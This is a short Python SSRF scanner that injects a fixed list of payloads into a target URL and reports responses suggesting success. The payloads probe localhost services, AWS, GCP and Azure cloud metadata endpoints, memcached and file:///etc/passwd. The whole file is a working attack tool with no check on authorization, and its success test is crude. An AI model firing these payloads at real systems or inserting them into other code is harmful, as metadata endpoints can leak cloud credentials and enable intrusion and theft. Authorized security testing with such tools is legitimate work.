#!/usr/bin/env python3
"""
SSRF-Scanner: A tool to identify Server-Side Request Forgery vulnerabilities.
Part of the Bughunt project (OWASP A10: SSRF).
"""

import requests
import argparse
import sys

# SSRF Payloads for internal services and cloud metadata
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://localhost:80",
    "http://169.254.169.254/latest/meta-data/", # AWS Metadata
    "http://metadata.google.internal/computeMetadata/v1/", # GCP Metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01", # Azure Metadata
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/", # Memcached
]

def scan_ssrf(url):
    print(f"[*] Starting SSRF scan on: {url}")
    
    if "FUZZ" not in url:
        print("[!] Error: No 'FUZZ' keyword found in URL.")
        return

    found = []
    for payload in SSRF_PAYLOADS:
        target = url.replace("FUZZ", payload)
        try:
            # We look for differences in response or internal indicators
            response = requests.get(target, timeout=5, allow_redirects=False)
            
            # Indicators of success:
            # 1. Status 200 for internal IP
            # 2. Presence of metadata keywords
            # 3. Content from file:///
            if response.status_code == 200 or "ami-id" in response.text or "root:x:" in response.text:
                print(f"\n[!] POTENTIAL SSRF DETECTED!")
                print(f"    Payload: {payload}")
                print(f"    URL:     {target}")
                found.append({"payload": payload, "url": target})
                
        except Exception:
            pass

    if not found:
        print("[-] No obvious SSRF vulnerabilities detected.")
    return found

def main():
    parser = argparse.ArgumentParser(description="SSRF-Scanner (OWASP A10)")
    parser.add_argument("url", help="Target URL with FUZZ keyword")
    args = parser.parse_args()
    scan_ssrf(args.url)

if __name__ == "__main__":
    main()
